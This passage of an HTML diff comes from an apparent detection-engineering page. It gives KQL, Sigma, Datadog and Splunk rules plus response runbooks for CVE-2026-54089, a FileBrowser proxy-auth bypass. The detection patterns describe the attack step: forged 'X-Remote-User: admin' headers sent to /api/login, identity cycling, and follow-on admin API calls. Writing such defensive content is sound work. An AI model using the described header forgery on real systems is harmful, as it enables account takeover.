+      <button class="tab-btn" data-target="art-269-uc0-sigma">Sigma</button>
+      <button class="tab-btn" data-target="art-269-uc0-datadog">Datadog</button>
+      <button class="tab-btn" data-target="art-269-uc0-falcon">Falcon LogScale</button>
+      <button class="tab-btn" data-target="art-269-uc0-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-269-uc0-kql"><pre><button class="copy-btn">COPY</button><code>DeviceNetworkEvents
+| where Timestamp &gt; ago(7d)
+| where ActionType == &quot;InboundConnectionAccepted&quot;
+| where LocalPort == 8085                       // FileBrowser container port from -p 8085:80
+| where RemoteIPType == &quot;Public&quot;
+| project Timestamp, DeviceName, RemoteIP, RemotePort, LocalIP, LocalPort, InitiatingProcessFileName
+| order by Timestamp desc</code></pre></div>
+    <div class="tab-content" id="art-269-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>CommonSecurityLog
+| where TimeGenerated &gt; ago(7d)
+| where DestinationPort == 8085                  // FileBrowser exposed container port
+| where DeviceAction in~ (&quot;allow&quot;,&quot;permit&quot;,&quot;accept&quot;,&quot;allowed&quot;)
+| where ipv4_is_private(SourceIP) == false
+| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, DestinationIP, DestinationPort, DeviceAction, RequestURL
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-269-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: FileBrowser Direct External Access to Exposed Port 8085 Bypassing Reverse Proxy
+id: 3e6f9c2a-8b41-4d77-9a1e-2c5d0f7b4a11
+description: Detects direct inbound connections to the FileBrowser container port (8085) from a non-private source, bypassing the reverse proxy that is the only auth boundary for auth.method=proxy (CVE-2026-54089).
+references:
+  - https://github.com/advisories/GHSA-xqp3-jq6g-x3qm
+author: SOC Detection Engineering
+date: 2026/07/18
+tags:
+  - attack.t1190
+  - attack.t1199
+logsource:
+  category: network_connection
+  product: windows
+detection:
+  selection:
+    DestinationPort: 8085
+    Initiated: false
+  filter_private:
+    SourceIp|cidr:
+      - &#x27;10.0.0.0/8&#x27;
+      - &#x27;172.16.0.0/12&#x27;
+      - &#x27;192.168.0.0/16&#x27;
+  condition: selection and not filter_private
+level: medium</code></pre></div>
+    <div class="tab-content" id="art-269-uc0-datadog"><pre><button class="copy-btn">COPY</button><code>source:windows.sysmon @EventID:3 @DestinationPort:8085</code></pre></div>
+    <div class="tab-content" id="art-269-uc0-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=NetworkConnectIP4 LocalPort=8085 ConnectionDirection=1
+| NOT cidr(&quot;10.0.0.0/8&quot;, field=RemoteAddressIP4)
+| NOT cidr(&quot;192.168.0.0/16&quot;, field=RemoteAddressIP4)
+| NOT cidr(&quot;172.16.0.0/12&quot;, field=RemoteAddressIP4)
+| groupBy([aid, ComputerName, RemoteAddressIP4, LocalPort], function=count())</code></pre></div>
+    <div class="tab-content" id="art-269-uc0-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-269-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-269-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-269-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count, min(_time) as firstTime, max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where All_Traffic.dest_port=8085 All_Traffic.action=allowed All_Traffic.src_category!=internal by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port, All_Traffic.transport | `drop_dm_object_name(All_Traffic)` | sort - lastTime</code></pre><pre class="spl-mode-body" id="art-269-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count, min(_time) as firstTime, max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where All_Traffic.dest_port=8085 All_Traffic.action=allowed All_Traffic.src_category!=internal by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port, All_Traffic.transport | `drop_dm_object_name(All_Traffic)` | sort - lastTime</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="a8f9e6bf7d" data-platforms="datadog,sent,sigma,spl" data-targets="linux,vcs">
+  <summary>
+    <span class="uc-title">FileBrowser proxy-auth header forgery naming admin on /api/login</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="a8f9e6bf7d" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Hunts POST /api/login requests carrying a proxy-auth identity header (X-Remote-User / X-Forwarded-User / X-Authenticated-User / X-Auth) whose value names an administrative account (admin/administrator/root) while originating from outside the trusted reverse-proxy egress range. Because ProxyAuth.Auth() trusts the header with no origin/secret check, a forged admin header from a non-proxy source is the direct signature of the CVE-2026-54089 authentication bypass and full admin takeover.
+
+Rationale: Uses the exact attack primitive from the PoC: a forged X-Remote-User (configurable via auth.header; ecosystem defaults are X-Remote-User / X-Forwarded-User per FileBrowser docs) naming &#x27;admin&#x27; sent to /api/login. Header value + non-proxy source IP is high-fidelity because legitimate proxy traffic always originates from the proxy egress IP and the proxy sets the header itself. Defender/Falcon/CloudWatch blank: HTTP request headers are not present in EDR or CloudTrail telemetry — this needs a WAF/proxy that logs request headers. Cross-checked against GHSA advisory, auth/proxy.go lines 21-28, and filebrowser.org/authentication.html.
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-xqp3-jq6g-x3qm
+  • https://advisories.gitlab.com/golang/github.com/filebrowser/filebrowser/v2/CVE-2026-54089/
+  • https://filebrowser.org/authentication.html</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Abuse Elevation Control Mechanism">T1548</span> <span class="ind tech" title="Modify Authentication Process">T1556</span> <span class="ind tech" title="Valid Accounts">T1078</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Web.Web</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>A misconfigured second reverse proxy not in the known egress allowlist forwarding legitimate SSO traffic</li><li>Penetration testers / red team validating the CVE from an internal-but-non-proxy host</li><li>A legitimate admin whose real username is literally &#x27;admin&#x27; logging in through a newly-added proxy node</li><li>WAF logging the header on blocked (not forwarded) requests during tuning</li><li>Automated config-management tooling hitting /api/login with a service header</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where tolower(ProxyUser) in (&quot;admin&quot;,&quot;administrator&quot;,&quot;root&quot;) and ipv4_is_private(SourceIP) == false</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: confirm the SourceIP is not a sanctioned reverse-proxy egress IP; if it is not, treat as a live bypass — a valid admin JWT was almost certainly minted. 2) Contain: block the SourceIP at the perimeter, restrict the FileBrowser port to proxy-only, rotate the JWT signing secret to revoke issued tokens, and force re-auth. 3) Hunt: enumerate all FileBrowser user accounts (auto-creation may have added attacker-named users), review /api/settings and /api/users changes and any file download/exec activity from the same session, and audit for non-admin X-Remote-User values from the same source.</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-269-uc1-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-269-uc1-sigma">Sigma</button>
+      <button class="tab-btn" data-target="art-269-uc1-datadog">Datadog</button>
+      <button class="tab-btn" data-target="art-269-uc1-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-269-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>CommonSecurityLog
+| where TimeGenerated &gt; ago(7d)
+| where RequestURL has &quot;/api/login&quot;
+| where RequestContext has_any (&quot;X-Remote-User&quot;, &quot;X-Forwarded-User&quot;, &quot;X-Authenticated-User&quot;, &quot;X-WebAuth-User&quot;, &quot;REMOTE_USER&quot;, &quot;X-Auth-User&quot;)   // proxy-auth identity header
+| extend ProxyUser = extract(@&quot;(?i)(?:X-Remote-User|X-Forwarded-User|X-Authenticated-User|X-WebAuth-User|REMOTE_USER|X-Auth-User)\s*[:=]\s*([^\s;,]+)&quot;, 1, RequestContext)
+| where tolower(ProxyUser) in (&quot;admin&quot;,&quot;administrator&quot;,&quot;root&quot;)     // privileged username in forged header
+| where ipv4_is_private(SourceIP) == false                          // not from trusted proxy egress
+| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, DestinationIP, RequestMethod, RequestURL, ProxyUser
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-269-uc1-sigma"><pre><button class="copy-btn">COPY</button><code>title: FileBrowser Proxy-Auth Header Forgery Naming Admin (CVE-2026-54089)
+id: 7b3e2c9a-1d4f-4a8b-9c2e-5f6a7b8c9d02
+description: Detects an inbound HTTP request to FileBrowser /api/login carrying a proxy-auth identity header whose value names a privileged account, the core header-forgery primitive of CVE-2026-54089.
+references:
+  - https://github.com/advisories/GHSA-xqp3-jq6g-x3qm
+author: SOC Detection Engineering
+date: 2026/07/18
+tags:
+  - attack.t1556
+  - attack.t1078
+  - attack.initial_access
+logsource:
+  category: webserver
+detection:
+  selection_uri:
+    cs-uri-stem|contains: &#x27;/api/login&#x27;
+  selection_header:
+    cs-header|contains:
+      - &#x27;X-Remote-User: admin&#x27;
+      - &#x27;X-Remote-User: administrator&#x27;
+      - &#x27;X-Remote-User: root&#x27;
+      - &#x27;X-Forwarded-User: admin&#x27;
+      - &#x27;X-Authenticated-User: admin&#x27;
+      - &#x27;X-Auth-User: admin&#x27;
+  condition: selection_uri and selection_header
+level: high</code></pre></div>
+    <div class="tab-content" id="art-269-uc1-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.syslog &quot;/api/login&quot; (&quot;X-Remote-User: admin&quot; OR &quot;X-Forwarded-User: admin&quot; OR &quot;X-Authenticated-User: admin&quot; OR &quot;X-Auth-User: admin&quot; OR &quot;REMOTE_USER: admin&quot;)</code></pre></div>
+    <div class="tab-content" id="art-269-uc1-spl"><span class="splunk-cat-pill splunk-cat-cloud" title="Splunk-research detection category">CLOUD</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-269-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-269-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-269-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count, min(_time) as firstTime, max(_time) as lastTime from datamodel=Web.Web where Web.url=&quot;*/api/login*&quot; Web.http_method=POST Web.user IN (&quot;admin&quot;,&quot;administrator&quot;,&quot;root&quot;) Web.src_category!=proxy by Web.src, Web.dest, Web.url, Web.http_method, Web.user, Web.status | `drop_dm_object_name(Web)` | sort - lastTime</code></pre><pre class="spl-mode-body" id="art-269-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count, min(_time) as firstTime, max(_time) as lastTime from datamodel=Web.Web where Web.url=&quot;*/api/login*&quot; Web.http_method=POST Web.user IN (&quot;admin&quot;,&quot;administrator&quot;,&quot;root&quot;) Web.src_category!=proxy by Web.src, Web.dest, Web.url, Web.http_method, Web.user, Web.status | `drop_dm_object_name(Web)` | sort - lastTime</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="8682fcad30" data-platforms="sent,spl" data-targets="">
+  <summary>
+    <span class="uc-title">FileBrowser auto-account-creation: first-seen username in proxy auth header</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Installation</span>
+    <span class="uc-conf medium">Medium</span>
+    <button class="share-btn" data-share-uc="8682fcad30" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Correlates /api/login requests carrying a proxy-auth username header from an untrusted source against a 30-day baseline of previously-seen usernames, surfacing brand-new (first-seen) usernames. FileBrowser&#x27;s createUser() unconditionally provisions a real account when the header names a non-existent user, giving attackers a no-authorization account-creation primitive; a first-seen username submitted from a non-proxy IP is the signature of backdoor account provisioning.
+
+Rationale: Targets the article&#x27;s second primitive: &#x27;specifying a non-existent username causes the server to automatically create a new user account.&#x27; A first-seen X-Remote-User value from a non-proxy IP maps directly to createUser() being triggered by an attacker-controlled header. Leftanti-join against a 30-day baseline expresses first-seen without ML. Defender/Falcon/CloudWatch blank: request-header username is only visible in WAF/proxy logs, not EDR/CloudTrail.
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-xqp3-jq6g-x3qm
+  • https://advisories.gitlab.com/golang/github.com/filebrowser/filebrowser/v2/CVE-2026-54089/</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Create Account: Local Account">T1136.001</span> <span class="ind tech" title="Account Manipulation">T1098</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Web.Web</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Genuine onboarding of a new employee whose SSO username is passed for the first time through a proxy node not yet in the trusted list</li><li>A newly-provisioned reverse proxy whose egress IP has not been added to the private/allowlist ranges</li><li>Baseline gap: usernames legitimately used before the 30-day window appearing &#x27;first-seen&#x27;</li><li>Service accounts or automation logging in via a header for the first time after a config change</li><li>WAF header-parsing quirks that extract a truncated username value</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where ProxyUser !in~ (&quot;guest&quot;,&quot;anonymous&quot;,&quot;health&quot;,&quot;healthcheck&quot;,&quot;monitor&quot;,&quot;probe&quot;)</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: list current FileBrowser accounts and compare against the first-seen ProxyUser value; a matching newly-created account confirms the auto-creation primitive fired. 2) Contain: delete the attacker-provisioned account(s), restrict the port to proxy-only, and rotate the JWT signing secret. 3) Hunt: review whether the new account&#x27;s default permissions include execute/create/modify (article notes Defaults.Apply may grant these), inspect file operations and command execution tied to that username, and search for additional first-seen usernames from the same SourceIP.</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-269-uc2-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-269-uc2-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-269-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>let Baseline = CommonSecurityLog
+    | where TimeGenerated between (ago(30d) .. ago(1d))
+    | where RequestURL has &quot;/api/login&quot;
+    | extend ProxyUser = extract(@&quot;(?i)(?:X-Remote-User|X-Forwarded-User|X-Authenticated-User|X-WebAuth-User|REMOTE_USER|X-Auth-User)\s*[:=]\s*([^\s;,]+)&quot;, 1, RequestContext)
+    | where isnotempty(ProxyUser)
+    | summarize by tolower(ProxyUser);
+CommonSecurityLog
+| where TimeGenerated &gt; ago(1d)
+| where RequestURL has &quot;/api/login&quot;
+| extend ProxyUser = extract(@&quot;(?i)(?:X-Remote-User|X-Forwarded-User|X-Authenticated-User|X-WebAuth-User|REMOTE_USER|X-Auth-User)\s*[:=]\s*([^\s;,]+)&quot;, 1, RequestContext)
+| where isnotempty(ProxyUser)
+| extend ProxyUser = tolower(ProxyUser)
+| join kind=leftanti Baseline on ProxyUser        // first-seen username only
+| where ipv4_is_private(SourceIP) == false
+| project TimeGenerated, SourceIP, DestinationIP, RequestURL, ProxyUser
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-269-uc2-spl"><span class="splunk-cat-pill splunk-cat-cloud" title="Splunk-research detection category">CLOUD</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-269-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-269-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-269-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count, min(_time) as firstTime, max(_time) as lastTime from datamodel=Web.Web where Web.url=&quot;*/api/login*&quot; Web.http_method=POST Web.src_category!=proxy by Web.user, Web.src, Web.dest, Web.url, Web.status | `drop_dm_object_name(Web)` | where firstTime &gt; relative_time(now(), &quot;-1d&quot;) | sort - firstTime</code></pre><pre class="spl-mode-body" id="art-269-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count, min(_time) as firstTime, max(_time) as lastTime from datamodel=Web.Web where Web.url=&quot;*/api/login*&quot; Web.http_method=POST Web.src_category!=proxy by Web.user, Web.src, Web.dest, Web.url, Web.status | `drop_dm_object_name(Web)` | where firstTime &gt; relative_time(now(), &quot;-1d&quot;) | sort - firstTime</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="fbff877b35" data-platforms="sent,sigma,spl" data-targets="vcs">
+  <summary>
+    <span class="uc-title">FileBrowser post-bypass admin API actions (DELETE/PUT /api/users, /api/settings)</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Actions on Objectives</span>
+    <span class="uc-conf medium">Medium</span>
+    <button class="share-btn" data-share-uc="fbff877b35" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Hunts privileged FileBrowser REST API calls — DELETE/PUT/POST against /api/users, /api/settings and /api/resources — originating from outside the trusted reverse-proxy egress range. After forging an admin JWT via the header bypass, an attacker uses these admin endpoints to modify settings, create/delete users, and manipulate files; admin-verb API traffic from a non-proxy source is the post-compromise action signature of CVE-2026-54089.
+
+Rationale: Maps to the article&#x27;s outcome: a minted admin JWT (perm.admin:true) grants full control, and the PoC shows admin API calls such as GET /api/settings. This UC widens to the state-changing admin verbs an attacker would issue post-bypass. Source-IP restriction to non-proxy origins keeps fidelity. Header-level context isn&#x27;t required, so this is expressible on standard proxy/webserver access logs.
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-xqp3-jq6g-x3qm
+  • https://advisories.gitlab.com/golang/github.com/filebrowser/filebrowser/v2/CVE-2026-54089/</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Abuse Elevation Control Mechanism">T1548</span> <span class="ind tech" title="Valid Accounts">T1078</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Web.Web</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate admin performing settings/user management through a proxy node not in the allowlist</li><li>Automated backup/config tooling issuing PUT /api/settings on a schedule</li><li>A monitoring integration polling /api/resources</li><li>Red-team/pentest validation of the CVE</li><li>New reverse-proxy egress IP not yet added to the private/allowlist ranges</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: confirm SourceIP is non-proxy; correlate to any preceding /api/login with an X-Remote-User admin header from the same IP to confirm the bypass chain. 2) Contain: block the SourceIP, restrict the port to proxy-only, rotate the JWT signing secret, and snapshot current FileBrowser settings/users for forensics. 3) Hunt: diff /api/settings and user list against last-known-good, review file resource operations (downloads/deletes) from the session, and check for command execution if the compromised/created account has the execute permission.</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-269-uc3-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-269-uc3-sigma">Sigma</button>
+      <button class="tab-btn" data-target="art-269-uc3-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-269-uc3-sentinel"><pre><button class="copy-btn">COPY</button><code>CommonSecurityLog
+| where TimeGenerated &gt; ago(7d)
+| where RequestMethod in~ (&quot;DELETE&quot;,&quot;PUT&quot;,&quot;POST&quot;)
+| where RequestURL has_any (&quot;/api/users&quot;, &quot;/api/settings&quot;, &quot;/api/resources&quot;)
+| where ipv4_is_private(SourceIP) == false                 // not from trusted proxy egress
+| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, DestinationIP, RequestMethod, RequestURL
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-269-uc3-sigma"><pre><button class="copy-btn">COPY</button><code>title: FileBrowser Privileged API Action From Untrusted Source (Post Proxy-Auth Bypass)
+id: 9a1c7e44-2f83-4b0d-8e6a-5d21f0c9b7e2
+description: Detects DELETE/PUT/POST calls to FileBrowser admin endpoints (/api/users, /api/settings, /api/resources) in reverse-proxy access logs, the post-compromise action set following CVE-2026-54089 admin JWT forgery.
+references:
+  - https://github.com/advisories/GHSA-xqp3-jq6g-x3qm
+author: SOC Detection Engineering
+date: 2026/07/18
+tags:
+  - attack.t1548
+  - attack.t1078
+logsource:
+  category: webserver
+detection:
+  selection:
+    cs-method:
+      - &#x27;DELETE&#x27;
+      - &#x27;PUT&#x27;
+    cs-uri-stem|contains:
+      - &#x27;/api/users&#x27;
+      - &#x27;/api/settings&#x27;
+      - &#x27;/api/resources&#x27;
+  condition: selection
+level: medium</code></pre></div>
+    <div class="tab-content" id="art-269-uc3-spl"><span class="splunk-cat-pill splunk-cat-web" title="Splunk-research detection category">WEB</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-269-uc3-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-269-uc3-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-269-uc3-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count, min(_time) as firstTime, max(_time) as lastTime from datamodel=Web.Web where (Web.url=&quot;*/api/users*&quot; OR Web.url=&quot;*/api/settings*&quot; OR Web.url=&quot;*/api/resources*&quot;) (Web.http_method=DELETE OR Web.http_method=PUT OR Web.http_method=POST) Web.src_category!=proxy by Web.src, Web.dest, Web.url, Web.http_method, Web.status | `drop_dm_object_name(Web)` | sort - lastTime</code></pre><pre class="spl-mode-body" id="art-269-uc3-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count, min(_time) as firstTime, max(_time) as lastTime from datamodel=Web.Web where (Web.url=&quot;*/api/users*&quot; OR Web.url=&quot;*/api/settings*&quot; OR Web.url=&quot;*/api/resources*&quot;) (Web.http_method=DELETE OR Web.http_method=PUT OR Web.http_method=POST) Web.src_category!=proxy by Web.src, Web.dest, Web.url, Web.http_method, Web.status | `drop_dm_object_name(Web)` | sort - lastTime</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="a9238de842" data-platforms="sent,spl" data-targets="">
+  <summary>
+    <span class="uc-title">FileBrowser identity-cycling: 3+ user identities from one untrusted source in 5 min</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="a9238de842" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Flags a single non-proxy source IP presenting 3 or more distinct FileBrowser user identities to the API within a 5-minute window. Legitimate proxy traffic carries one authenticated identity per user and the proxy egress IP is stable per session; rapid identity-switching from one direct source indicates the attacker is cycling forged X-Remote-User header values to impersonate multiple accounts — the &#x27;impersonate any user&#x27; behaviour of CVE-2026-54089.
+
+Rationale: Directly implements the article&#x27;s &#x27;impersonate any user&#x27; claim: because the header is attacker-chosen with no verification, an attacker enumerating/impersonating accounts produces many distinct identities from a single direct source in a short window — a shape legitimate per-user proxy auth cannot produce. dcount over a 5-minute bin is a threshold+temporal correlation, so Sigma is skipped. Defender/Falcon/CloudWatch blank: the authenticated username per web request lives in proxy/WAF logs, not EDR or CloudTrail.
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-xqp3-jq6g-x3qm
+  • https://cvereports.com/reports/CVE-2026-54089</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Valid Accounts">T1078</span> <span class="ind tech" title="Use Alternate Authentication Material: Application Access Token">T1550.001</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Web.Web</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Multiple real users behind a single corporate NAT / CGNAT egress IP hitting FileBrowser (if that egress isn&#x27;t classified as proxy)</li><li>A VPN concentrator or shared jump host from which several admins legitimately work</li><li>Automated test suites iterating multiple test users against the API</li><li>A load/perf test cycling synthetic accounts</li><li>Mobile users sharing a carrier-grade NAT address</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: inspect the Users set from the flagged SrcIpAddr — presence of admin/root alongside several unrelated usernames strongly indicates impersonation cycling; confirm the IP is not a sanctioned NAT/proxy egress. 2) Contain: block the SourceIP, restrict the FileBrowser port to proxy-only, and rotate the JWT signing secret to void all forged tokens. 3) Hunt: for each impersonated username, review file downloads/deletes and settings/user changes in the same window, and check whether any of those identities were auto-created (never existed before).</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-269-uc4-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-269-uc4-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-269-uc4-sentinel"><pre><button class="copy-btn">COPY</button><code>ImWebSession
+| where TimeGenerated &gt; ago(1d)
+| where Url has &quot;/api/&quot;
+| where isnotempty(SrcUsername)
+| where ipv4_is_private(SrcIpAddr) == false
+| summarize DistinctUsers = dcount(SrcUsername), Users = make_set(SrcUsername, 20), Requests = count()
+          by SrcIpAddr, bin(TimeGenerated, 5m)
+| where DistinctUsers &gt;= 3          // 3+ identities from one non-proxy IP in 5 min = header cycling, not legit multi-user
+| order by DistinctUsers desc</code></pre></div>
+    <div class="tab-content" id="art-269-uc4-spl"><span class="splunk-cat-pill splunk-cat-cloud" title="Splunk-research detection category">CLOUD</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-269-uc4-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-269-uc4-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-269-uc4-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true dc(Web.user) as distinct_users, values(Web.user) as users, count from datamodel=Web.Web where Web.url=&quot;*/api/*&quot; Web.src_category!=proxy by _time span=5m, Web.src, Web.dest | `drop_dm_object_name(Web)` | where distinct_users &gt;= 3 | sort - distinct_users</code></pre><pre class="spl-mode-body" id="art-269-uc4-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false dc(Web.user) as distinct_users, values(Web.user) as users, count from datamodel=Web.Web where Web.url=&quot;*/api/*&quot; Web.src_category!=proxy by _time span=5m, Web.src, Web.dest | `drop_dm_object_name(Web)` | where distinct_users &gt;= 3 | sort - distinct_users</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="b03f1bae96" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows">
+  <summary>
+    <span class="uc-title">FileBrowser instance configured with auth.method=proxy (exploitable-config exposure)</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Reconnaissance</span>
+    <span class="uc-conf medium">Medium</span>
